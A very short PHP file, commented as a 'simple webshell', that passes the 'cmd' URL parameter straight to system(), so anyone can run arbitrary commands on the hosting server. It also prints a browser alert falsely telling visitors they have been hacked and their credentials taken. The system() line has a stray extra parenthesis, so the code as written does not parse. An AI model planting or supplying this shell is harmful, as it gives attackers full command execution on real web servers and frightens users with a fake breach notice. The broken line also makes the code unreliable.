<?php
// Simple webshell to perform commands on the web app
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']));
    }
    
    echo '<script>alert("You have just been hacked! We have your credentials.")</script>';
?>